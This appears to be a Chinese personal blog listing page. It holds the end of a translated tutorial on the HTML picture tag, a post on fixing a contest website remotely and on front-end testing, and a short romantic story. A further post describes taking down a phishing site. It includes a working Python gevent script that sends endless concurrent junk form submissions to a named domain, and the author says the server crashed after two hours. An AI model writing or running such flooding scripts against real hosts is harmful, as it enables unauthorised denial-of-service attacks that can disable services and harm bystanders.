<p>在没有增加 <code>source</code> 标签时，<code>picture</code> 标签是死的：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;picture&gt;</span>
    <span class="nt">&lt;source</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/picture&gt;</span>
</code></pre></div>
<p>当选择所要展示的图片时，浏览器会从第一个 <code>source</code> 标签开始遍历，直到找到一个 <code>media</code> 值为 <code>true</code> 的 <code>source</code> 标签为止。该 <code>source</code> 标签的 <code>srcset</code> 属性将会被采用。</p>

<p>例如，我们可以为图片指定”肖像“（portrait）格式和”风景“格式：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;picture&gt;</span>
    <span class="nt">&lt;source</span> <span class="na">media=</span><span class="s">&quot;orientation:landscape&quot;</span> <span class="na">srcset=</span><span class="s">&quot;horizontal-image.jpg&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;source</span> <span class="na">media=</span><span class="s">&quot;orientation:portrait&quot;</span> <span class="na">srcset=</span><span class="s">&quot;vertical-image.jpg&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/picture&gt;</span>
</code></pre></div>
<p>甚至，我们可以用 x 描述符 和 w 描述符 来指定多幅图片：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;picture&gt;</span>
    <span class="nt">&lt;source</span> <span class="na">media=</span><span class="s">&quot;orientation:landscape&quot;</span> <span class="na">srcset=</span><span class="s">&quot;retina-horizontal-image.jpg 2x, horizontal-image.jpg&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;source</span> <span class="na">media=</span><span class="s">&quot;orientation:portrait&quot;</span> <span class="na">srcset=</span><span class="s">&quot;retina-vertical-image.jpg 2x, vertical-image.jpg&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/picture&gt;</span>
</code></pre></div>
<p>在 <code>sizes</code> 属性中使用 media query 时，我会质疑在 HTML 而不是在 CSS 中基于样式来控制图片的合理性。然而，如果你需要，<code>media</code> 属性也不失为一种选择。</p>

<h2>使用 type</h2>

<p><code>picture</code> 标签真正厉害的地方，在于它能从不同的图片类型中作出选择。</p>

<p>想象我们现在有一张标准 PNG 图片，但我们想用 <a href="https://developers.google.com/speed/webp/?hl=en">WebP</a> 格式去替换它，因为这会缩减 26% 的体积——记住，响应式图片的核心在于 用最小的数据量提供尽可能高质量的图片——然而目前它仅被 Chrome、Opera 和 Android 内置浏览器所支持。我们需要使用 <code>type</code> 属性来确定 <code>WebP</code> 格式是否被支持：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;picture&gt;</span>
    <span class="nt">&lt;source</span> <span class="na">type=</span><span class="s">&quot;image/webp&quot;</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.webp 2x, image.webp 1x&quot;</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">srcset=</span><span class="s">&quot;retina-image.jpg 2x&quot;</span> <span class="na">src=</span><span class="s">&quot;image.jpg&quot;</span> <span class="na">alt=</span><span class="s">&quot;an image&quot;</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/picture&gt;</span>
</code></pre></div>
<p>在这个案例中，浏览器会先检查是否支持 <code>WebP</code> 格式。如果是，它会继续判断屏幕是否有足够的像素密度去显示 <code>retina-image,webp</code> 图片，如果不是，则会显示 <code>image.webp</code> 。倘若 <code>WebP</code> 不被支持，浏览器将会径直跳至 <code>img</code> 标签处并解析——这部分我们已经非常熟悉了。</p>

<p><code>type</code> 属性的出现，意味着在环境支持的情况下，我们可以可以提供体积更小的图片格式。</p>

<h2>已知的问题</h2>

<p>在 IE9 中有一个已知的问题：<code>picture</code> 标签将不会静默失败。为了处理 IE9 的情况，你需要欺骗 IE9，让它以为 <code>source</code> 标签是 <code>video</code> 标签的一部分：</p>
<div class="highlight"><pre><code class="language-html" data-lang="html">
</code></pre></div>
<p>这是一个丑陋的解决方案——但聊胜于无。我们只能期望 Windows10 的发布能够加速 IE9 退出市场，因为虽然 Edge 也不支持 <code>picture</code> 标签，但至少它会用正确的方式来处理（静默失败）。</p>

<p>当然，也有相应的 <a href="https://scottjehl.github.io/picturefill/">polyfills</a> 来实现 IE 对 <code>picture</code> 的兼容，但我的建议是去避免它。我从来不信任用 Javascript 打补丁，因为这会极大地影响性能，同时也让代码变得不可维护。</p>

<p>出于这种原因，我建议现在还是最好不要使用 <code>picture</code> 标签。除非，你在运营一个大规模的电子商务网站，由 <code>WebP</code> 格式节省下来的下载时间实在不足以弥补因对代码打补丁所带来的不便。</p>

<p>一旦 IE9 的市场份额降至 1% 以下——也许发生在明年的某一个时刻（译者注：歪果仁的看法不代表天朝的实际情况），<code>picture</code> 标签就会变得可以接受（viable）。如果你在 2016 年读到这篇文章，或许，这种方案值得你去实践。</p>

<h2>创建 响应式图片</h2>

<p>不像 SVG，位图 （ To be continue ...)</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#翻译-ref">
    		翻译 <span>2</span>
    	</a></li>
     
    	<li><a href="/categories.html#编程-ref">
    		编程 <span>36</span>
    	</a></li>
     
    	<li><a href="/categories.html#web设计-ref">
    		web设计 <span>1</span>
    	</a></li>
    
  


          </ul>
          

         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/wisecity-conclusion/">Wisecity 商赛总结——也谈前端自动化测试</a>
            </h1>
            <p class="time">24 Jul 2015</p>
        </header>
        <section class="content">
            <p>真没想到，高伯还是给了我两百块报酬（土豪就是土豪）——我还担心他连运营成本都不肯给呢，毕竟网站做得并不是令人太满意。为社团做了两年的网站，这是第一次收到报酬，也算是自己赚的第一桶金吧。</p>

<p>事实证明，临去北京前我给 cc 开放了管理者权限是一个非常正确的选择。尽管 wisecity 已经举办了两届，尽管在此之前我已做过 4 个网站，尽管这次的网站是在上一届的基础上进行改造的，我的心里仍有些忐忑不安，害怕它会出什么问题——抑或是大会的工作人员操作不当导致网站崩溃云云（这事真的发生了）。5 天的 wisecity 大会，我都身在北京，身边没有电脑，没有解决问题的条件，因此需要一个有基本的编程能力的人协助我。5 天下来，问题还不少，调试的过程可谓是十分原始：接到问题后，囿于有限的条件，我只能通过翻看手机上的代码，在脑海中模拟并觉出问题所在，找到最小代价的改动方案，再将改动之处通过短信通知 cc——当然，很多时候并不那么顺利，我还需要跟多的信息帮助判断，比如错误日志，又比如进行特定操作时的表现（这个最坑爹，可遇而不可求）。我尽一切努力在脑海中想象着程序的流程，很累，但也很有挑战性。</p>

<p>第一天就遇到了一个棘手的问题：高伯在删除测试数据时不小心把管理员账号（admin）一起删掉了。这个消息从扬声器传出后，我足足沉默了一分钟，
心里像是有千万头草泥马奔过：</p>

<blockquote>
<p>怎么这么毛手毛脚？这下可好了，麻烦大了——虽然这个设计是有些不合理，但这不能怪我，django 已经封装好了（姜戈：怪我咯？）。快想办法快想办法……直接去后台加一个？不行不行，密码这块很难弄，MD5 + SHA1 + Salt，根本不是人能算的——只能让 django 自己产生一个用户了。嗯，我需要一个 MySQL，一个完整的 Python 开发环境，各种包……不知 cc 能不能应付过来。真是的一大早!@#$%^……
<img src="http://i6.hexunimg.cn/2012-05-09/141219425.jpg" alt=""> </p>
</blockquote>

<p>挂断电话，抄起手机噼里啪啦给 cc 发了一条短信，手把手教配置 MySQL，django，导出 SQL，上传数据库……吧啦吧啦洋洋洒洒几百字。发送时一直祈祷：但愿 cc 悟性高一些，不然真的完了——还好，半个小时后，前线传来了好消息：一切顺利。</p>

<p>总算是松了一口气，才发现，背已汗湿。</p>

<p>然而，事情还没有结束。</p>

<p>第二天一早，我又被告知：上传的文件下载不了（纳尼？走之前不是才作过测试吗）。点开文件看网址，发现原来是七牛的域名后面少了一个<code>/</code>，很快便处理好了。本以为可以好好玩一天了（那天出去玩），逛了大半个北京，夕阳西下时，却又接到一个 bug：选手列表只显示了 10 个用户，但应该有 40+ 个。</p>

<p>这个 bug，前后调了 2 个小时。从奥林匹克公园，到中关村——因为，我并不知道问题出在哪，一点也不知道。打 <code>console.log</code>，翻看网络记录（没错！在短信这种高时滞的通讯条件下！），最终发现，原来是 REST 返回的用户列表顺序反了，加载了最后 10 个，但由于用户没有明显的顺序标志，所以调试时没有察觉。改正之后，终于可以安心吃完饭——</p>

<p>谁知，两分钟后，短信又开始轰炸了：加载的用户列表有重复项！很多的重复项！！没有规律的重复项！！！</p>

<p>这个 bug，前后又调了 2 个小时。从中关村，再到人大附中，直到繁星爬满了苍穹。第一个反应是自制的瀑布流控件滚动事件并发处理没有做好。翻看源代码，似乎找到一处疑似有问题的地方，尝试让 cc 改了一下——半个小时后，传回了一个令人泄气的消息（中间配置<code>grunt</code>又耗费了好些功夫）。冥想了一个小时，前后端的代码都看遍了，就是没有发现问题，最终只得放弃，告诉高伯用一些奇技*巧避开重复项。直至回来后，静下心分析代码，才发现在一个不起眼的地方有一处笔误，这是重构 HFMUN 的瀑布流控件时产生的。</p>

<p>之后的几天，又有几个大大小小的 bug，抑或是需求改动，处理得还算顺利。可怕的是最后一天，KVDB 直接宕掉了——我整个缓存都是挂在 KVDB 上的，也怪当时没有作容灾处理，这个事件直接导致全站报 500 错误。急急忙忙关掉了缓存（还好做缓存时解了耦，只需改动两处即可），然后再质问 SAE，这些都是后话了。</p>

<p>然而，这里有个值得反思的问题：既然我已经作过 4 个网站，为何还是会有 bug 出现？从 HFMUN 1.0，到 wisecity 1.0，到 HFMUN 2.0，随着我技术的逐渐成熟，bug 出现的频率也在不断下降——但是 bug 仍在，就像“杀不死的小强”一样。</p>

<p>测试，关键还是在测试。</p>

<p>人的主观意识，受制于时空、环境等诸多因素，任何一个参数的改变都有可能影响主观能动性的发挥。因此，不能保证在任何时候人的意识都能正确地、高效地发挥作用。软件工程，作为人类纯意识的产物，其正确性并不能百分百地保证。或是精神不振引起的一处笔误，或是重构迁移时没有同步更改的一处配置，抑或是一处自己在开发过程中完全没有意识到的错误——设计归设计，程序是否能运行，还是电脑说了算。许多的 bug 就是这样产生的。</p>

<p>这个时候，单元测试（Unit Test）就显得非常重要了。通过分析需求而设计的测试样例，可以保证功能的相对正确性，即在能够考虑到的所有情况下，程序都能狗正常运行。这是重构（Refactory）过程中十分重要的一个环节，因为外部不变性是重构必须遵守的一个准则。</p>

<p>在软件工程的上古时代，测试常常是由人工来完成的。团队中，总有几名成员每天都在做着重复、机械的工作，即对新增的功能或是修改过的功能进行测试。这种测试机制费时费力，同时也不是非常有效——上面已经说过了，没有人能保证主观意识的正确性。后来，出现了基于脚本的批量测试，测试人员可以编写一小段代码对特定的功能进行校验，很大程度地提高了效率；再到今天的分布式测试，成熟的测试系统可以模拟多种不同的生产环境，检测到代码库的变化后，便会自动进行单元测试。这是单元测试的自动化进程。</p>

<p>今天的自动化测试固然很成熟，基本可以检测到各种逻辑错误。但在测试领域，却仍有一处令其束手无策的“禁地”——这便是 GUI 测试。综合分析 wisecity2.0 的 bugs，其中大部分都是前端出了问题。GUI 测试的麻烦在于：</p>

<ul>
<li>GUI 是一个输入与输出交替进行的系统，并且输入具有无限的可能，无法用有限的测试样例对输入进行覆盖。比如第二天发生的那个 bug 需要在“文件上传成功后，跳转到首页，点击下载链接”、“用户数量超过 10 个，在列表页面快速滚动鼠标滚轮”才能被触发。许多的 bug 只有在真实生产环境中被用户捕捉到。</li>
<li>GUI 的正确性没有一个绝对的判定标准。元素错位、颜色不正确，这些事件都不报错，但它们也是 bug，通常也只有人类认为它们是 bug。但它们的发生并不影响功能，只是用户体验（User Experience）不好——用户体验是一个纯主观的概念，至少在当下，计算机是不能理解的。</li>
</ul>

<p>目前，GUI 测试主要还是依赖人工。Facebook 就有一个庞大的测试人员系统，以模拟尽可能多的用户操作样例。诚然，业界已经开始出现一些 前端自动化测试框架，有如 selenium、phantomjs 等通过 mock 事件模拟用户操作，更有甚者如 PhantomCSS 可以对特定操作的结果进行像素比对，可软件的主观部分还是需要人脑来判断。</p>

<p>这是一个好时代，周围的一切都在飞快地变化着。希望在不久的将来，当人工智能出现时，这个问题能够有效地解决。</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#编程-ref">
    		编程 <span>36</span>
    	</a></li>
     
    	<li><a href="/categories.html#总结-ref">
    		总结 <span>1</span>
    	</a></li>
     
    	<li><a href="/categories.html#前端-ref">
    		前端 <span>1</span>
    	</a></li>
     
    	<li><a href="/categories.html#单元测试-ref">
    		单元测试 <span>1</span>
    	</a></li>
    
  


          </ul>
          

        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-tags"></i></li>
            
            


  
     
    	<li><a href="/tags.html#wisecity-ref">wisecity <span>1</span></a></li>
     
    	<li><a href="/tags.html#前端自动化测试-ref">前端自动化测试 <span>1</span></a></li>
    
  



          </ul>
         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/how-to-fuck-a-bilk-site/">记一次 DoS 诈骗网站的经历</a>
            </h1>
            <p class="time">24 Jul 2015</p>
        </header>
        <section class="content">
            <p>题海中激战，正当不亦乐乎时，手机响了。低头一看，是 95599 的短信：</p>

<blockquote>
<p>尊敬的农行用户，您的账户积分累计现可兑换价值 1024 元现金大礼包！请手机登陆 <a href="http://wap.abchyd.com">wap.abchyd.com</a> 进行领取！【农业银行】</p>
</blockquote>

<p>1024 元？哼！这个数还挺整，但一看就是诈骗短信：哪有银行的域名长得和天书一样？更何况，我又没有农行的账户。</p>

<p>正待删除时，一个念头划过脑海，指尖悬停在屏幕上方。</p>

<p>突然想起昨天在 Freebuf 上看到的一篇文章，说是一个黑帽把臭名昭著的“10086 诈骗”给调戏了一番，在其数据库里填满了垃圾。Freebuf 上许多黑技术我从来都是可望而不可即，唯独这个比较简单——不就是写个脚本嘛，几分钟的事。既然他骗人骗到我这里来了，何不好好调戏一下呢？</p>

<p>果断打开电脑，打开 Chrome，输入网址，映入眼帘的是一个表单（网站已被黑掉因此就没有图了，好吧我错了），要求用户填写 银行卡、密码、手机号还有一个逼格很高的验证码。</p>

<p>F12 分析，发现对各个字段的校验仅仅局限于长度的检查，连格式检查都没有。至于验证码，随便填写四个数字就可以通过了（真是弱爆了，好吗！）。表单提交后跳转到一个有菊花加载圈的页面——说是“稍等，切勿关闭页面”，但其实这个页面并不会跳转，也不会有其他的操作，只有那个菊花一直在转。扫一眼地址栏，发现是<code>asp</code>结尾——这又给了我不小的鼓励（这里并没有黑微软的意思， ASP 是十年前的产物，放在现在可以说是弱的不行了）。</p>

<p>该怎么调戏呢？一个想法飞快地在脑海中产生——对了，就用高并发的垃圾数据拖爆它的数据库吧。这类钓鱼网站通常都是 IIS 6.0 + ASP + SQL SERVER，并且还是单机服务器，并发度一高机器很容易就垮了。</p>

<p>简单地谢了一个脚本：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#! /usr/bin/python</span>

<span class="kn">import</span> <span class="nn">gevent.monkey</span>
<span class="n">gevent</span><span class="o">.</span><span class="n">monkey</span><span class="o">.</span><span class="n">patch_all</span><span class="p">()</span>
<span class="kn">import</span> <span class="nn">gevent</span>
<span class="kn">import</span> <span class="nn">urllib2</span><span class="o">,</span> <span class="nn">urllib</span>
<span class="kn">from</span> <span class="nn">uuid</span> <span class="kn">import</span> <span class="n">uuid1</span>

<span class="k">def</span> <span class="nf">fuck</span><span class="p">():</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid1</span><span class="p">())[:</span><span class="mi">16</span><span class="p">]</span>
    <span class="k">print</span> <span class="s">&#39;fucking&#39;</span><span class="p">,</span> <span class="nb">id</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s">&#39;http://www.abchyd.com/add_1.asp&#39;</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
            <span class="s">&#39;logonCardNum&#39;</span><span class="p">:</span> <span class="nb">id</span><span class="p">,</span>
            <span class="s">&#39;netType&#39;</span><span class="p">:</span> <span class="s">&#39;111111&#39;</span><span class="p">,</span>
            <span class="s">&#39;tel&#39;</span><span class="p">:</span> <span class="s">&#39;12345678900&#39;</span><span class="p">,</span>
            <span class="s">&#39;randomId&#39;</span><span class="p">:</span> <span class="s">&#39;1234&#39;</span>
        <span class="p">}))</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>

    <span class="k">print</span> <span class="s">&#39;fucking&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="p">,</span> <span class="s">&#39;ok&#39;</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">gevent</span><span class="o">.</span><span class="n">joinall</span><span class="p">([</span><span class="n">gevent</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="n">fuck</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">)])</span>
</code></pre></div>
<p>这里用 <code>gevent</code> 将 Socket 由阻塞型改装为协程型，以提高请求的并发度。</p>

<p>接着，关掉所有的图形界面，只开一个终端（为了节省内存），运行 <code>./fuckit.py</code>。哈哈哈，受死吧！</p>

<p>用平板再次打开该网址（电脑已经跑不起浏览器了），可以发现网站已经明显慢了下来，时不时还会有 500 错误。</p>

<p>两个小时后。</p>

<p>当我再次访问网站时，它已经完全当机了。用<code>nmap</code>扫了一遍，也没有端口活着了。一台邪恶的服务器就这样被干掉了。</p>

<p>但我知道，这样的服务器，在世界上还存在着许多许多。曾经有段时间，不断遇到域名为 www.10086xxx.com 的诈骗网站。常常是一个域名被封了，另一个域名便冒出来，可见诈骗者拥有海量的资源。</p>

<p>这次的攻击只是一次游戏，一次尝试，得以成功只是因为对方太弱了。</p>

<p>真正的网络攻防战，远不止如此。</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#安全-ref">
    		安全 <span>1</span>
    	</a></li>
     
    	<li><a href="/categories.html#编程-ref">
    		编程 <span>36</span>
    	</a></li>
    
  


          </ul>
          

         
    </article>
  
    <article class="post-content">
        <header class="text-center">
            <h1 class="post-title">
                <a href="/secret/">不能说的秘密</a>
            </h1>
            <p class="time">12 Jun 2015</p>
        </header>
        <section class="content">
            <p>又遇到了一道难题。他轻轻放下笔，缓缓抬起了头。无意中，目光触及了她的背影。夕阳透过窗子，给那一隅洒下一片金黄，增添了几分童话般的意境。</p>

<p>他的心动了一下，但很快又抑制住了那种奇妙的感觉。随即，他笑了笑，便埋下头去，继续解决那道艰深的难题。</p>

<p>他知道，这一切，只是为了那个诺言。</p>

<p>他清楚地记得，在早些时候，他和她许下了一个诺言：这三年，我们就把对方当成空气吧，谁也不认识谁。</p>

<p>很奇怪的约定，不是吗？既然是同班同学，抬头不见低头见，又何出此言。</p>

<p>想到这，他竟有些羞愧起来。</p>

<p>而事实上，在更早些的时候，他们的关系并不是这样的——甚至，还是较要好的朋友。在那个遥远的年代，当女孩还未成为少女，他们还曾一起外出学习，一起嬉闹。他俩的相识源于各自父母的同学关系——他很高兴，她也很高兴，自己有这么一个朋友。</p>

<p>是的，只是朋友，不是别的什么——一个令人向往的时候。</p>

<p>上了初中，尽管进了不同的班级，他还是偶尔会去找她。一切依旧。</p>

<p>但不知为何，一些奇怪的话却在班上渐渐漫开，如同疯长的野草。每一次去找她，他都感觉背后有人在窃窃私语，甚至还有几双异样的目光。诚然，在这个情窦初开的年纪，这样的一种关系是很敏感的。</p>

<p>起初，他很反感这些言论。每一次，他都会极力辩解，甚至和对方吵得面红耳赤。可换来的，却是各种鬼脸，以及更加刻薄的话，就像火上浇油一般。</p>

<p>渐渐地，他学会了沉默。为了避开那些讨厌的话，也不再那么频繁地去找她了。</p>

<p>但，不知为什么，这之后每次想起她，心里却多了一些异样的感觉——这在以前是没有的，一种莫名的、不由自主的激动，一种朦胧的依恋——</p>

<p>就像那流言蜚语所说的，他喜欢上她了。</p>

<p>人，真是奇怪的动物。</p>

<p>他不再对那些传言感到愤怒，甚至，还附和起来，公开表露自己的心声——这时，他清楚：这已不再是传言，而是自己真实的想法。</p>

<p>然而，她却在悄悄地发生变化——不知为何，他每次去找她，她却借故不出来。在路上相遇，也不打招呼，没有微笑，宛如陌生人一般。</p>

<p>他很奇怪，却也没多想，大概是有了新朋友罢——人都会长大的。</p>

<p>直到，那个落雨的夏夜。</p>

<p>那天，正是中考放榜的日子，他得知她和自己考入了同一所重点高中，并进入了同一个重点班，很是兴奋。刚想通过QQ为她庆贺，不料却发觉：自己已被她拉黑了。</p>

<p>想起初中三年的种种变化，他再也忍不住了，立即发短信询问她。得到的，却是她冰冷的回复：</p>

<p>“之前我一直把你当朋友，可你却把我们想成某种关系，还到处宣扬。这让我很受伤。我想，我们还是不要做朋友了……”</p>

<p>“接下来的三年，我真的不知道该如何度过，和你同在一个班，我真的很痛苦。就把我当成空气吧，这样对你我都好……”</p>

<p>他沉默了，回想自己的种种，的确，有些太过分了。但他却不知，这些事，会如此伤她的心。</p>

<p>也好，就让我们彼此当陌生人吧。</p>

<p>夕阳转了个角度，那一片金黄在一点点扩大，但同时也变得更加温柔。</p>

<p>两年了，他们没有说过一句话。</p>

<p>尽管流言蜚语早已不在，他也不愿再与她接触——一切，都是因为那个诺言。</p>

<p>如果不能做朋友，那不伤害对方，也是一种善良。</p>

<p>“之前你们关系不是很好的吗？怎么现在像不认识了一样？”两年来，常有好奇的人问他。</p>

<p>每一次，他都会神秘地笑一笑：</p>

<p>“这是一个不能说的秘密。”</p>

<p>（致：那个被伤害过的她）</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#杂感-ref">
    		杂感 <span>8</span>
    	</a></li>
    
  


          </ul>
          

        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-tags"></i></li>
            
            


  
     
    	<li><a href="/tags.html#不经意间的感动-ref">不经意间的感动 <span>5</span></a></li>
    
  



          </ul>
         
    </article>
  
</div>

<ul class="pager">
  
    <li class="previous">
      <a class="prev" href="/page2/">&larr; 上一页</a>
    </li>
  
  
</ul>

  </div>
</div>


      </div>

    </div>

    <div id="footer">
      <div class="container">
        <p class="text-center">
          Powered by Jekyll. Hosted at Github. <br>
          Copyright &copy; hsfzxjy.
        </p>
      </div>
    </div>

    <script type="text/javascript">
    var duoshuoQuery = {short_name:"hsfzxjy"};
      (function() {
        var ds = document.createElement('script');
        ds.type = 'text/javascript';ds.async = true;
        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
        ds.charset = 'UTF-8';
        (document.getElementsByTagName('head')[0] 
         || document.getElementsByTagName('body')[0]).appendChild(ds);
      })();
    </script>
    <script src="/assets/themes/bootstrap-3/bootstrap/js/bootstrap.min.js" defer async="true"></script>
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        extensions: ["tex2jax.js"],
        jax: ["input/TeX", "output/HTML-CSS"],
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"] ],
          displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
          processEscapes: true
        },
        "HTML-CSS": { availableFonts: ["TeX"] }
      });
    </script>
    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default" defer async="true"></script>
  </body>
</html>
